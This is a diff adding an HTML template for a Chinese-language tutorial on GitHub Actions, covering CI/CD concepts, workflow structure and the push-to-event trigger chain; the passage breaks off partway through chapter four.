@@ -1,0 +1,3550 @@
+<!--
+  页面外壳模板 —— doc/cicd/github-actions-完全指南.html 由 build-cicd-page.js 生成。
+  这个文件不是可直接打开的页面：它含有三个占位符，必须由构建脚本填充。
+  占位符分别是“目录”“正文”“日期”，名称定义在 build-cicd-page.js 的 MARKERS 里。
+
+  ⚠ 不要在这段注释里写出占位符本身。占位符按首次出现替换，写在这里会让
+    整个正文被注入到注释内部，页面看起来一片空白（构建脚本现在会拦住这种情况）。
+
+  改这里的样式或 hero 文案之后，跑一次 `npm run build:cicd` 重新生成页面。
+  正文内容仍然只在 .md 里改，不要直接编辑生成出来的 .html。
+-->
+<!doctype html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <meta name="description" content="沿一次 git push 逐层拆解 GitHub Actions：ref 如何变成事件、workflow 文件读哪个 commit、任务如何加密后送到 Runner、GITHUB_TOKEN 与 OIDC 的权限模型，以及把一个真实项目从手工 git pull 改成自动部署的完整做法。">
+  <title>GitHub Actions 完全指南 — YJ Knowledge Bank</title>
+  <link rel="icon" href="../../img/icons/icon1.png">
+  <style>
+    * { box-sizing: border-box; }
+    html { scroll-behavior: smooth; }
+    body { margin: 0; color: var(--kb-text); background: var(--kb-page); font-family: var(--kb-font-sans); }
+    a { color: var(--kb-brand); }
+
+    /* ---- Hero ---- */
+    .hero { padding: 92px 24px 68px; border-bottom: 1px solid var(--kb-line); overflow: hidden; }
+    .hero-inner { width: min(1180px, 100%); margin: 0 auto; display: grid; grid-template-columns: minmax(0, 1.1fr) minmax(330px, .9fr); gap: 64px; align-items: center; }
+    .eyebrow, .chapter-no { font-family: var(--kb-font-mono); text-transform: uppercase; letter-spacing: .12em; }
+    .eyebrow { margin-bottom: 20px; color: var(--kb-coral); font-size: .76rem; font-weight: 700; }
+    h1 { max-width: 760px; margin: 0; color: var(--kb-ink); font-size: clamp(2.3rem, 5.4vw, 4.7rem); line-height: 1.06; letter-spacing: -.045em; }
+    .hero-copy { max-width: 690px; margin: 26px 0 0; color: var(--kb-muted); font-size: 1.06rem; line-height: 1.85; }
+    .hero-copy code { font-size: .88em; }
+    .tag-row { display: flex; flex-wrap: wrap; gap: 8px; margin-top: 28px; }
+    .tag { padding: 7px 11px; border: 1px solid var(--kb-line); border-radius: 999px; background: var(--kb-surface); color: var(--kb-muted); font: 700 .7rem/1 var(--kb-font-mono); }
+    .hero-stack { position: relative; padding: 25px; border: 1px solid var(--kb-line); border-radius: var(--kb-radius-xl); background: var(--kb-surface-strong); }
+    .hero-stack::before { content: "ONE PUSH, FIVE STAGES"; display: block; margin-bottom: 17px; color: var(--kb-muted); font: 700 .67rem/1 var(--kb-font-mono); letter-spacing: .1em; }
+    .stack-row { display: grid; grid-template-columns: 96px 1fr; gap: 12px; align-items: center; padding: 11px 13px; border-radius: var(--kb-radius-sm); }
+    .stack-row + .stack-row { margin-top: 7px; }
+    .stack-row span { color: var(--kb-muted); font: .66rem var(--kb-font-mono); }
+    .stack-row strong { color: var(--kb-ink); font-size: .87rem; }
+    .stack-row:nth-child(2), .stack-row:nth-child(5), .stack-row:nth-child(8) { background: var(--kb-brand-soft); }
+    .stack-row:nth-child(3), .stack-row:nth-child(4), .stack-row:nth-child(6), .stack-row:nth-child(7) { border: 1px solid var(--kb-line); }
+    .stack-arrow { height: 13px; margin-left: 47px; border-left: 1px dashed var(--kb-muted); }
+
+    /* ---- Layout + TOC ---- */
+    .layout { width: min(1200px, calc(100% - 40px)); margin: 0 auto; display: grid; grid-template-columns: 220px minmax(0, 1fr); gap: 52px; padding: 56px 0 96px; }
+    .toc { position: sticky; top: 88px; align-self: start; max-height: calc(100vh - 112px); overflow: auto; padding: 16px 0; }
+    .toc-title { margin: 0 0 12px 13px; color: var(--kb-muted); font: 700 .68rem var(--kb-font-mono); letter-spacing: .12em; }
+    .toc a { display: block; padding: 8px 12px; border-left: 2px solid transparent; color: var(--kb-muted); text-decoration: none; font-size: .83rem; line-height: 1.35; }
+    .toc a:hover, .toc a.active { border-left-color: var(--kb-brand); background: var(--kb-brand-soft); color: var(--kb-brand); }
+    .content { min-width: 0; }
+
+    /* ---- Chapters ---- */
+    .chapter { scroll-margin-top: 90px; margin-bottom: 76px; }
+    .chapter-head { margin-bottom: 25px; }
+    .chapter-no { display: inline-block; margin-bottom: 8px; color: var(--kb-coral); font-size: .7rem; font-weight: 700; }
+    h2 { margin: 0; color: var(--kb-ink); font-size: clamp(1.6rem, 3vw, 2.2rem); line-height: 1.3; letter-spacing: -.025em; }
+    h3 { margin: 42px 0 13px; color: var(--kb-ink); font-size: 1.22rem; line-height: 1.45; scroll-margin-top: 88px; }
+    h4 { margin: 32px 0 11px; color: var(--kb-ink); font-size: 1.06rem; line-height: 1.5; letter-spacing: -.01em; }
+    p, li { line-height: 1.85; }
+    p { margin: 12px 0; }
+    ul, ol { margin: 12px 0; padding-left: 22px; }
+    li { margin: 6px 0; }
+    strong { color: var(--kb-ink); }
+
+    /* ---- Code ---- */
+    code { padding: .14em .38em; border-radius: 5px; background: var(--kb-brand-soft); color: var(--kb-brand); font-family: var(--kb-font-mono); font-size: .9em; }
+    pre { overflow-x: auto; margin: 18px 0; padding: 21px 23px; border-radius: var(--kb-radius-md); background: var(--kb-code); color: var(--kb-code-text); font: .855rem/1.72 var(--kb-font-mono); }
+    pre code { padding: 0; background: transparent; color: inherit; font-size: 1em; }
+
+    /* ---- Callouts ---- */
+    .callout { margin: 22px 0; padding: 20px 22px; border: 1px solid var(--kb-line); border-left: 4px solid var(--kb-brand); border-radius: var(--kb-radius-md); background: var(--kb-surface-strong); }
+    /* Two classes so this outranks the shared "html.kb-system p" colour rule. */
+    .callout .callout-title { margin: 0 0 8px; color: var(--kb-ink); font-weight: 800; }
+    .callout > *:last-child { margin-bottom: 0; }
+    .callout pre:last-child { margin-bottom: 0; }
+    .callout.warning { border-left-color: var(--kb-warning); background: var(--kb-warning-soft); }
+
+    /* ---- Tables ----
+       The shared stylesheet already gives every table its own border + radius,
+       so the wrapper carries no border of its own (that would double it up). */
+    .table-wrap { overflow-x: auto; margin: 22px 0; }
+    table { width: 100%; border-collapse: collapse; background: var(--kb-surface-strong); font-size: .9rem; }
+    th, td { min-width: 108px; padding: 13px 15px; border-bottom: 1px solid var(--kb-line); text-align: left; vertical-align: top; line-height: 1.65; }
+    th { background: var(--kb-brand-soft); color: var(--kb-ink); }
+    tr:last-child td { border-bottom: 0; }
+
+    /* ---- Footer ---- */
+    .footer { padding: 34px 24px; border-top: 1px solid var(--kb-line); }
+    .footer-inner { width: min(1180px, 100%); margin: 0 auto; display: flex; flex-wrap: wrap; justify-content: space-between; gap: 14px; align-items: center; font-size: .84rem; }
+    .footer strong { color: var(--kb-ink); }
+
+    @media (max-width: 900px) {
+      .hero-inner { grid-template-columns: 1fr; gap: 38px; }
+      .layout { grid-template-columns: 1fr; }
+      .toc { position: static; display: flex; gap: 6px; overflow-x: auto; padding: 8px 0 16px; max-height: none; }
+      .toc-title { display: none; }
+      .toc a { flex: 0 0 auto; border: 1px solid var(--kb-line); border-radius: 999px; }
+    }
+    @media (max-width: 720px) {
+      .hero { padding: 62px 20px 48px; }
+      .hero-stack { padding: 17px; }
+      .stack-row { grid-template-columns: 82px 1fr; }
+      .stack-arrow { margin-left: 41px; }
+      .layout { width: min(100% - 32px, 1200px); gap: 24px; padding-top: 32px; }
+      .chapter { margin-bottom: 58px; }
+      pre { padding: 17px 15px; font-size: .8rem; }
+      .callout { padding: 17px 16px; }
+    }
+  </style>
+  <link rel="stylesheet" href="../../assets/css/kb-design-system.css">
+  <script defer src="../../assets/js/kb-design-system.js"></script>
+</head>
+<body>
+  <header class="hero">
+    <div class="hero-inner">
+      <div>
+        <div class="eyebrow">CI / CD · GitHub Actions · Mental Model</div>
+        <h1>从一次 git push，<br>到一台机器替你跑测试</h1>
+        <p class="hero-copy">你按下回车，代码离开你的键盘没有多久，远端已经有人替你拉取、装依赖、编译、测试、发布。本文沿着这条链路自底向上拆开 GitHub Actions：ref 是怎么变成事件的、workflow 文件读的是哪个 commit 的版本、任务被加密后送到了哪台机器上执行、<code>GITHUB_TOKEN</code> 到底是谁的什么身份。最后落回一个真实项目——把手工的 <code>git pull</code> 换成自动部署。</p>
+        <div class="tag-row">
+          <span class="tag">WORKFLOW</span>
+          <span class="tag">RUNNER</span>
+          <span class="tag">GITHUB_TOKEN</span>
+          <span class="tag">OIDC</span>
+          <span class="tag">截至 2026-09 核对</span>
+        </div>
+      </div>
+      <div class="hero-stack" aria-label="一次推送触发的五个阶段">
+        <div class="stack-row"><span>REF UPDATE</span><strong>git push 更新 refs/heads/main</strong></div><div class="stack-arrow"></div>
+        <div class="stack-row"><span>EVENT</span><strong>服务端生成 push 事件</strong></div><div class="stack-arrow"></div>
+        <div class="stack-row"><span>RESOLVE</span><strong>选定某个 commit 的 workflow 文件</strong></div><div class="stack-arrow"></div>
+        <div class="stack-row"><span>MATCH</span><strong>on: 过滤器匹配成功</strong></div><div class="stack-arrow"></div>
+        <div class="stack-row"><span>SCHEDULE</span><strong>拆分 job → 入队 → Runner 长轮询领走</strong></div>
+      </div>
+    </div>
+  </header>
+
+  <div class="layout">
+    <aside class="toc" aria-label="本页目录">
+      <p class="toc-title">CONTENTS</p>
+        <a href="#ch-overview">导言</a>
+        <a href="#ch-prereq">前置知识</a>
+        <a href="#ch-1">01 起点：手工发布的代价</a>
+        <a href="#ch-2">02 四个核心问题</a>
+        <a href="#ch-3">03 五个核心概念</a>
+        <a href="#ch-4">04 触发链路</a>
+        <a href="#ch-5">05 Runner 与执行环境</a>
+        <a href="#ch-6">06 工作流语法解剖</a>
+        <a href="#ch-7">07 Action 与复用</a>
+        <a href="#ch-8">08 身份、密钥与权限</a>
+        <a href="#ch-9">09 缓存与产物</a>
+        <a href="#ch-10">10 实战：自动部署</a>
+        <a href="#ch-11">11 调试与排错</a>
+        <a href="#ch-12">12 成本与限额</a>
+        <a href="#ch-13">13 关键概念速查表</a>
+        <a href="#ch-14">14 延伸阅读</a>
+    </aside>
+
+    <main class="content">
+      <section class="chapter" id="ch-overview">
+        <div class="chapter-head"><span class="chapter-no">INTRO</span><h2>概述</h2></div>
+<p>你在本地敲下 <code>git push</code>，几秒钟后浏览器里的 GitHub 页面出现一个橙色小圆点，然后变绿——你的代码在没有你参与的情况下被拉取、装依赖、编译、测试、打包、发布到了服务器上。</p>
+<p>这个过程看起来像魔法，但它的每一层都是可以被拆开的：<code>push</code> 在协议层做了什么、GitHub 服务端如何把&quot;某个 ref 变了&quot;变成一个事件、它读取哪个 commit 里的配置文件、任务被加密后送到哪台机器上执行、产物又存到了哪里。</p>
+<p>本文沿着<strong>一条真实的推送链路</strong>自底向上拆解 GitHub Actions，最后落到&quot;如何给我自己的项目加上自动构建和自动发布&quot;的实操。</p>
+
+<div class="callout"><p class="callout-title">版本说明</p>
+<p>本文核对日期为 <strong>2026-09-21</strong>。文中 action 版本号取自 GitHub Release API 当日最新，与官方文档示例可能有出入——官方文档的示例代码通常滞后一到两个大版本。写 workflow 时请以 <a href="https://github.com/actions" target="_blank" rel="noopener">github/actions</a> 各仓库的 README 为准。</p>
+</div>
+      </section>
+
+      <section class="chapter" id="ch-prereq">
+        <div class="chapter-head"><span class="chapter-no">PREREQ</span><h2>前置知识</h2></div>
+<ul>
+<li><a href="../frp-nginx-networking-guide.html">内网穿透 + Nginx HTTPS 详解</a> —— webhook 本质是一次 HTTPS POST，理解 TLS 与 HTTP 语义有助于理解事件投递</li>
+<li>Git 基础：commit / tree / blob / ref / branch / tag 的对象模型，以及 <code>git push</code> 的传输过程</li>
+<li>基本的 YAML 语法（缩进敏感、不支持 Tab）</li>
+</ul>
+
+      </section>
+
+      <section class="chapter" id="ch-1">
+        <div class="chapter-head"><span class="chapter-no">01</span><h2>一、起点：没有 CI/CD 的世界</h2></div>
+<h3 id="ch-1-1">1.1 手工流程长什么样</h3>
+<p>先看一个真实的例子。这个知识库仓库当前的部署流程（摘自仓库 README）是这样的：</p>
+<pre><code>① 本地修改文档
+② git push 到 GitHub
+③ SSH 登录物理机
+④ cd /home/yj/code/yj-knowledge-bank &amp;&amp; git pull
+⑤ sudo systemctl restart yj-knowledge-bank
+⑥ 打开浏览器，手动确认页面正常
+</code></pre>
+<p>这条流水线<strong>能跑</strong>，而且对一个人维护的小项目来说，甚至是合理的选择。但它把&quot;如何构建和发布&quot;这件事编码在了人的记忆里，而不是编码在仓库里。</p>
+<h3 id="ch-1-2">1.2 手工流程的问题</h3>
+<div class="table-wrap"><table>
+<thead>
+<tr>
+<th>问题</th>
+<th>具体表现</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><strong>不可复现</strong></td>
+<td>第 ④ 步依赖&quot;物理机上正好装好了 Node 18&quot;。换台机器就崩，且没人记得清到底装了什么</td>
+</tr>
+<tr>
+<td><strong>无人执行</strong></td>
+<td>周末推的代码，周一才想起来部署。忘记部署的版本和已部署的版本不一致</td>
+</tr>
+<tr>
+<td><strong>无记录</strong></td>
+<td>上周三部署的是哪个 commit？出的问题是哪个版本引入的？没有系统性答案</td>
+</tr>
+<tr>
+<td><strong>无验证</strong></td>
+<td>一个坏掉的链接、一段跑不通的脚本，直到用户点开页面才发现</td>
+</tr>
+<tr>
+<td><strong>凭证散落</strong></td>
+<td>SSH 私钥在你本地、服务器密码在笔记里、部署脚本散落在 shell history</td>
+</tr>
+<tr>
+<td><strong>无法协作</strong></td>
+<td>别人想贡献代码，得先问你&quot;改完怎么测&quot;</td>
+</tr>
+<tr>
+<td><strong>顺序耦合</strong></td>
+<td>必须在正确的目录、以正确的用户、在正确的时机执行，顺序错了就出问题</td>
+</tr>
+</tbody>
+</table></div>
+<p>核心矛盾就一句话：<strong>流程存在于人的脑子里，而代码存在于版本库中，两者没有绑定。</strong></p>
+<h3 id="ch-1-3">1.3 CI / CD / CD 三个词的辨析</h3>
+<p>这三个缩写经常被混用，但含义不同：</p>
+<div class="table-wrap"><table>
+<thead>
+<tr>
+<th>术语</th>
+<th>英文</th>
+<th>含义</th>
+<th>边界在哪</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><strong>持续集成</strong></td>
+<td>Continuous Integration (CI)</td>
+<td>每次代码变更后<strong>自动构建并验证</strong>，尽早发现集成错误</td>
+<td>止于&quot;验证通过&quot;，不涉及发布</td>
+</tr>
+<tr>
+<td><strong>持续交付</strong></td>
+<td>Continuous Delivery</td>
+<td>在 CI 基础上，<strong>始终保证有一个可发布版本</strong>，但发布动作由人点击</td>
+<td>止于&quot;随时可发布&quot;，发布仍需手动确认</td>
+</tr>
+<tr>
+<td><strong>持续部署</strong></td>
+<td>Continuous Deployment</td>
+<td>验证通过后<strong>自动发布到生产环境</strong>，无需人工干预</td>
+<td>无人值守</td>
+</tr>
+</tbody>
+</table></div>
+<pre><code>代码提交 ──► 构建 ──► 测试 ──► 打包 ──► 部署到预发 ──► 部署到生产
+              │        │        │           │              │
+              └────────┴────────┴───────────┘              │
+                        CI（集成）                  ────────┘
+                                               持续交付需人工点这一下
+                                               持续部署自动走完
+</code></pre>
+<p><strong>实践建议</strong>：从 CI 开始（收益最高、风险最低），再逐步加自动部署。对个人项目，&quot;打 tag 自动发布&quot;往往是性价比最高的一步。</p>
+<h3 id="ch-1-4">1.4 范式转移：把流水线写成代码</h3>
+<p>CI 系统的核心思想是 <strong>Pipeline as Code</strong>——流水线的定义和源代码躺在同一个仓库里，跟着代码一起 review、一起版本化、一起回滚。</p>
+<p>这条思想在演进中产生了三代方案：</p>
+<div class="table-wrap"><table>
+<thead>
+<tr>
+<th>代际</th>
+<th>代表</th>
+<th>流水线定义在哪</th>
+<th>调度模型</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>第一代</td>
+<td>Jenkins</td>
+<td>自建 master 机器上的 <code>Jenkinsfile</code></td>
+<td>自己维护 master/agent，自己付服务器钱</td>
+</tr>
+<tr>
+<td>第二代</td>
+<td>GitLab CI / Travis</td>
+<td>仓库内的 <code>.gitlab-ci.yml</code></td>
+<td>平台托管 runner</td>
+</tr>
+<tr>
+<td>第三代</td>
+<td>GitHub Actions</td>
+<td>仓库内的 <code>.github/workflows/*.yml</code></td>
+<td>平台托管调度器 + runner 池 + <strong>可复用组件市场</strong></td>
+</tr>
+</tbody>
+</table></div>
+<p>GitHub Actions 相对前两代的关键差异有两点：</p>
+<ol>
+<li><strong>完全事件驱动</strong>。不只是&quot;push 后跑流水线&quot;，而是仓库上发生的<strong>任何事</strong>（开 issue、发评论、打 tag、发 release、定时）都能触发工作流。</li>
+<li><strong>action 市场</strong>。把&quot;装 Node&quot;&quot;登录 Docker Registry&quot;&quot;发通知&quot;这些步骤封装成可引用的组件，<code>uses: actions/setup-node@v7</code> 一行搞定，不用自己写脚本。</li>
+</ol>
+
+      </section>
+
+      <section class="chapter" id="ch-2">
+        <div class="chapter-head"><span class="chapter-no">02</span><h2>二、第一性原理：任何 CI 系统必须回答的四个问题</h2></div>
+<p>抛开具体产品，任何一个&quot;自动构建系统&quot;都绕不开四个问题。理解了这四个问题，你就能把任何 CI 系统（Jenkins、GitLab CI、CircleCI、GitHub Actions）映射到同一张地图上。</p>
+<pre><code>┌──────────────────────────────────────────────────────────────┐
+│                                                              │
+│   ① 什么时候跑？        ─────►  触发       Trigger            │
+│                                                              │
+│   ② 在哪里跑？          ─────►  环境       Runner             │
+│                                                              │
+│   ③ 跑什么？            ─────►  流水线     Pipeline           │
+│                                                              │
+│   ④ 结果去哪？          ─────►  产物/回传   Artifact/Status   │
+│                                                              │
+└──────────────────────────────────────────────────────────────┘
+         ▲                                              │
+         │              ⑤ 用什么身份跑？                 │
+         └──────────────  凭证 Credential  ◄─────────────┘
+</code></pre>
+<p>第二张图补充了第五个问题——<strong>用什么身份去访问外部系统</strong>（拉私有依赖、推镜像、连服务器）。这个问题在 GitHub Actions 里对应 <code>GITHUB_TOKEN</code>、Secrets 和 OIDC。</p>
+<h3 id="ch-2-1">2.1 四个问题在各系统中的映射</h3>
+<div class="table-wrap"><table>
+<thead>
+<tr>
+<th>问题</th>
+<th>GitHub Actions</th>
+<th>GitLab CI</th>
+<th>Jenkins</th>
+<th>本地手工</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>① 触发</td>
+<td><code>on:</code></td>
+<td><code>rules:</code> / <code>only:</code></td>
+<td>Webhook / 轮询 SCM</td>
+<td>你的大脑</td>
+</tr>
+<tr>
+<td>② 环境</td>
+<td><code>runs-on:</code></td>
+<td><code>tags:</code> + runner</td>
+<td>Agent 节点</td>
+<td>你的笔记本</td>
+</tr>
+<tr>
+<td>③ 流水线</td>
+<td><code>jobs</code> / <code>steps</code></td>
+<td><code>stages</code> / <code>script</code></td>
+<td><code>Jenkinsfile</code></td>
+<td>shell 脚本</td>
+</tr>
+<tr>
+<td>④ 产物</td>
+<td>artifacts / checks / releases</td>
+<td><code>artifacts:</code></td>
+<td>归档 + 插件</td>
+<td>复制到服务器</td>
+</tr>
+<tr>
+<td>⑤ 凭证</td>
+<td><code>GITHUB_TOKEN</code> / Secrets / OIDC</td>
+<td>CI Variables</td>
+<td>Credentials 插件</td>
+<td>~/.ssh 和 .env</td>
+</tr>
+</tbody>
+</table></div>
+<p><strong>这张表就是本文的目录。</strong> 接下来四章依次展开 ①~④，第八章展开 ⑤。</p>
+<h3 id="ch-2-2">2.2 为什么 GitHub Actions 的&quot;触发&quot;是难点</h3>
+<p>其他四个问题在其他系统里也有，只有&quot;触发&quot;这一块 GitHub Actions 做得最细——因为它把 Git 服务端和 CI 调度器合并在同一个系统里，所以能拿到<strong>最原始、最细粒度的仓库事件</strong>，而不需要靠轮询或 webhook 转发。</p>
+<p>这也意味着：<strong>理解 GitHub Actions 的触发链路，等于理解 GitHub 服务端的一部分工作原理。</strong> 这是第四章的内容。</p>
+
+      </section>
+
+      <section class="chapter" id="ch-3">
+        <div class="chapter-head"><span class="chapter-no">03</span><h2>三、心智模型：五个核心概念</h2></div>
+<p>在写第一行 YAML 之前，先把五个概念的位置关系钉死。</p>
+<h3 id="ch-3-1">3.1 层次结构</h3>
+<pre><code>┌─────────────────────────────────────────────────────────────────┐
+│  .github/workflows/ci.yml        ← 一个文件 = 一个 Workflow      │
+│                                                                 │
+│  ┌───────────────────────────┐   ┌───────────────────────────┐  │
+│  │  Job A   (build)          │   │  Job B   (test)           │  │
+│  │  ─────────────────────    │   │  ─────────────────────    │  │
+│  │  运行在：一台 Ubuntu 机器  │   │  运行在：另一台 Ubuntu 机  │  │
+│  │                           │   │                           │  │
+│  │  Step 1  uses: checkout   │   │  Step 1  uses: checkout   │  │
+│  │  Step 2  run: npm ci      │   │  Step 2  run: npm test    │  │
+│  │  Step 3  run: npm build   │   │                           │  │
+│  └───────────────────────────┘   └───────────────────────────┘  │
+│              │                                ▲                 │
+│              └──── needs: build ──────────────┘                 │
+│                                                                 │
+└─────────────────────────────────────────────────────────────────┘
+
+Workflow  一个 YAML 文件定义的完整流水线
+  Job     一次执行单元，独占一台机器，Job 之间默认并行且互相隔离
+    Step  一条命令或一个 action，顺序执行，共享同一台机器的文件系统
+</code></pre>
+<h3 id="ch-3-2">3.2 五个概念的精确定义</h3>
+<div class="table-wrap"><table>
+<thead>
+<tr>
+<th>概念</th>
+<th>一句话</th>
+<th>关键性质</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><strong>Workflow</strong></td>
+<td>一个 <code>.github/workflows/*.yml</code> 文件</td>
+<td>一个仓库可以有任意多个 workflow，各自独立触发</td>
+</tr>
+<tr>
+<td><strong>Job</strong></td>
+<td>一组 step 的集合，跑在<strong>一台独立的机器</strong>上</td>
+<td>默认并行；默认<strong>不共享文件系统</strong>；有独立的生命周期</td>
+</tr>
+<tr>
+<td><strong>Step</strong></td>
+<td>一个 <code>run:</code> 命令或一个 <code>uses:</code> action</td>
+<td>顺序执行；<strong>每个 <code>run</code> 是一个新的 shell 进程</strong></td>
+</tr>
+<tr>
+<td><strong>Action</strong></td>
+<td>可复用的构建块（脚本的封装）</td>
+<td>三种类型：JS / Docker / Composite</td>
+</tr>
+<tr>
+<td><strong>Runner</strong></td>
+<td>真正执行 job 的那台机器</td>
+<td>GitHub 托管（Azure VM）或自建（self-hosted）</td>
+</tr>
+</tbody>
+</table></div>
+<h3 id="ch-3-3">3.3 三个最容易踩的&quot;隔离&quot;陷阱</h3>
+<p><strong>陷阱一：Job 之间不共享文件系统</strong></p>
+<p>job A 里 <code>npm run build</code> 生成的 <code>dist/</code>，在 job B 里是<strong>不存在的</strong>。要传递必须走 artifact（见第九章）。</p>
+<p><strong>陷阱二：Step 之间不共享 shell 环境</strong></p>
+<pre><code class="language-yaml">steps:
+  - run: export FOO=bar      # ← 这个变量在下一个 step 里不存在
+  - run: echo $FOO           # ← 输出空字符串
+</code></pre>
+<p>每个 <code>run</code> 都是一次全新的 shell 启动。要跨 step 传递必须写进 <code>$GITHUB_ENV</code>（见 6.6）。</p>
+<p><strong>陷阱三：<code>cd</code> 不会保留</strong></p>
+<pre><code class="language-yaml">steps:
+  - run: cd subdir           # ← 下一个 step 还在仓库根目录
+  - run: pwd                # ← 输出的是 workspace 根目录
+</code></pre>
+<p>正确做法是用 <code>working-directory</code>（见 6.4）。</p>
+
+<div class="callout"><p class="callout-title">一句话记住</p>
+<p><strong>Job 是隔离的机器，Step 是顺序的命令。</strong> 跨 Job 传数据靠 artifact，跨 Step 传数据靠 <code>$GITHUB_ENV</code>。</p>
+</div>
+      </section>
+
+      <section class="chapter" id="ch-4">
+        <div class="chapter-head"><span class="chapter-no">04</span><h2>四、触发链路：从 git push 到 workflow 启动</h2></div>
+<p>这是全文最核心的一章。回答一个问题：<strong>你本地的一次 <code>git push</code>，是怎么变成远端一台机器上的一条 <code>npm test</code> 命令的？</strong></p>
+<p>整条链路有五步：</p>
+<pre><code>  你的电脑                                    GitHub 服务端
+  ─────────                                   ─────────────
+                                ┌──────────────────────────────────────────┐
+  git push                      │                                          │
+      │                         │   ① 接收对象 + 更新 ref                   │
+      │  ① 传输对象与 ref 更新   │      refs/heads/main: a1b2c3 → d4e5f6    │
+      └────────────────────────►│              │                           │
+                                │              ▼                           │
+                                │   ② 生成事件（事件总线）                   │
+                                │      push 事件 { ref, before, after,     │
+                                │                 commits[], pusher }      │
+                                │              │                           │
+                                │              ▼                           │
+                                │   ③ 确定读取哪个 commit 的 workflow 文件   │
+                                │              │                           │
+                                │              ▼                           │
+                                │   ④ 匹配 workflow 的 on: 过滤器           │
+                                │              │                           │
+                                │              ▼                           │
+                                │   ⑤ 创建 workflow run，拆分 job 入队       │
+                                └──────────────┬───────────────────────────┘
+                                               │
+                        长轮询（加密的 job 载荷）│
+                                               ▼
+                                        Runner (Azure VM)
+                                        ./run.sh → npm test
+</code></pre>
+<h3 id="ch-4-1">4.1 第一步：git push 在协议层做了什么</h3>
+<p><code>git push</code> 不是&quot;上传文件&quot;，它是一次<strong>协商式的对象传输 + 引用更新</strong>。以 HTTPS 或 SSH 承载的 <code>git-receive-pack</code> 服务为例：</p>
+<pre><code>客户端                                           GitHub
+  │                                                │
+  │  1. GET /info/refs?service=git-receive-pack    │
+  │ ──────────────────────────────────────────────►│
+  │ ◄──────────  远端当前所有 ref 及指向的 commit    │
+  │                                                │
+  │  2. POST /git-receive-pack                     │
+  │     ① 客户端告知&quot;我有哪些对象&quot;（have/want 协商）│
+  │     ② 服务端告知&quot;我还缺哪些对象&quot;                │
+  │ ──────────────────────────────────────────────►│
+  │     ③ 客户端打包缺失对象（PACK），压缩后上传     │
+  │ ──────────────────────────────────────────────►│
+  │                                                │
+  │     ④ 客户端发送 ref 更新命令：                  │
+  │        update refs/heads/main                  │
+  │        old: a1b2c3...  new: d4e5f6...          │
+  │ ──────────────────────────────────────────────►│
+  │                                                │
+  │                          ⑤ 服务端校验：          │
+  │                             - 身份/权限          │
+  │                             - fast-forward？    │
+  │                             - 分支保护规则？      │
+  │                             - 签名要求？          │
+  │                                                │
+  │                          ⑥ 写入 ref             │
+  │                             refs/heads/main     │
+  │                                  → d4e5f6...   │
+  │ ◄──────────  报告每个 ref 的更新结果             │
+</code></pre>
+<p>关键认知：<strong>GitHub 是在第 ⑥ 步之后才产生事件的。</strong></p>
+<p>事件描述的不是&quot;有个文件变了&quot;，而是 <strong>&quot;某个 ref 从 A 变成了 B&quot;</strong>。这个视角的差异非常重要，它解释了后面的很多行为：</p>
+<ul>
+<li>为什么 <code>on: push</code> 的 <code>paths</code> 过滤器要遍历 commits 才能算出哪些文件变了</li>
+<li>为什么只推 tag 不推分支，<code>push</code> 事件也会触发（tag 也是一个 ref）</li>
+<li>为什么强制推送（force push）会触发一次 <code>push</code> 事件，且 <code>before</code> 与 <code>after</code> 没有祖先关系</li>
+<li>为什么删除分支也会触发 <code>push</code>（<code>after</code> 是全零 SHA）</li>
+</ul>
+<h3 id="ch-4-2">4.2 第二步：服务端把 ref 更新变成事件</h3>
+<p>GitHub 服务端在 ref 更新后，会向内部事件总线投递一个事件。这个事件最终会被序列化成 JSON——<strong>这就是你在表达式里能访问到的 <code>github.event</code></strong>。</p>
+<pre><code class="language-jsonc">// push 事件的载荷（节选，字段名与 github.event.* 一一对应）
+{
+  &quot;ref&quot;: &quot;refs/heads/main&quot;,              // github.ref
+  &quot;before&quot;: &quot;a1b2c3...&quot;,                 // 推送前的 commit
+  &quot;after&quot;:  &quot;d4e5f6...&quot;,                 // 推送后的 commit ← github.sha 就是它
+  &quot;created&quot;: false,                      // 是否是新建分支
+  &quot;deleted&quot;: false,                      // 是否是删除分支
+  &quot;forced&quot;:  false,                      // 是否是强制推送
+  &quot;compare&quot;: &quot;https://github.com/.../compare/a1b2c3...d4e5f6&quot;,
+  &quot;commits&quot;: [                           // 这次推送包含的提交
+    {
+      &quot;id&quot;: &quot;d4e5f6...&quot;,
+      &quot;message&quot;: &quot;docs: refine blog narratives&quot;,
+      &quot;author&quot;: { &quot;name&quot;: &quot;...&quot;, &quot;email&quot;: &quot;...&quot; },
+      &quot;added&quot;:    [&quot;doc/new.md&quot;],        // ← paths 过滤器基于这三个字段
+      &quot;removed&quot;:  [],
+      &quot;modified&quot;: [&quot;index.html&quot;],
+      &quot;distinct&quot;: true
+    }
+  ],
+  &quot;head_commit&quot;: { /* 最后一个 commit 的完整对象 */ },
+  &quot;pusher&quot;: { &quot;name&quot;: &quot;chunyujin&quot;, &quot;email&quot;: &quot;...&quot; },   // github.actor（注意区别）
+  &quot;repository&quot;: { &quot;full_name&quot;: &quot;chunyujin295/yj-knowledge-bank&quot;, ... },
+  &quot;sender&quot;: { &quot;login&quot;: &quot;chunyujin&quot; }     // github.triggering_actor
+}
+</code></pre>
+
+<div class="callout warning"><p class="callout-title">一个容易忽略的细节</p>
+<p><code>github.actor</code> 是<strong>推送者</strong>（pusher），而 <code>github.triggering_actor</code> 才是<strong>触发这次运行的人</strong>。在 <code>workflow_dispatch</code> 手动触发、以及 <code>GITHUB_TOKEN</code> 触发的场景下，这两个值会不同。做审计日志时别用错。</p>
+</div>
+<p><strong>事件速率限制</strong>：单个仓库每 10 秒最多产生 1500 个事件，每 10 秒最多排队 500 个 workflow run（一个包含 30 个 reusable workflow 的调用树算作 1 个）。正常开发推送远达不到这个量级，但如果用脚本批量推几千个 tag，就要留意了。</p>
+<h3 id="ch-4-3">4.3 第三步：读取哪个 commit 里的 workflow 文件？</h3>
+<p>这是整个模型里<strong>最反直觉、也最容易导致安全问题</strong>的一步。</p>
+<p>GitHub 需要执行 <code>.github/workflows/*.yml</code>，但仓库历史里有无数个版本的这个文件。它读哪一个？</p>
+<div class="table-wrap"><table>
+<thead>
+<tr>
